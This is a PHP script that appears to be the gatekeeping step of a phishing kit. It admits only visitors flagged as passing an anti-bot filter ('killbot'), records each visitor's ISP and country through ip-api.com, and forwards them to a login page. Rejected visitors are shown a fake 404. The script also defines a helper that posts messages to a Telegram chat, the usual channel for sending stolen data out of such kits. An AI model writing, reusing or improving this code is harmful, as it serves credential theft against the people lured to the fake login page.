<?php
session_start();
include('../server/all.php');
include('../settings.php');

$ip_api_url = "http://ip-api.com/json/";

function getIPDetails($ip, $api_url) {
    $details = json_decode(file_get_contents("$api_url{$ip}"));
    return $details;
}

// Fonction pour envoyer un message à Telegram
function sendMessageToTelegram($message, $api_url, $chat_id) {    
    $apiUrl = "$api_url?chat_id=$chat_id&text=" . urlencode($message);    
    $response = file_get_contents($apiUrl);    
    return $response ? true : false;
}

if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] == true) { 
   
    $ip = $_SESSION['ip2'];    
    $ipDetails = getIPDetails($ip, $ip_api_url);
    $isp = isset($ipDetails->isp) ? $ipDetails->isp : 'ISP Inconnu';
    $country = isset($ipDetails->country) ? $ipDetails->country : 'Pays Inconnu';
    $_SESSION['isp_client'] = $isp;
    $_SESSION['pays_client'] = $country;  

    header("Location: login.php");
    exit();
    
} else {
    session_destroy();
    header("Location: ../404.php");
    exit();
}

?>
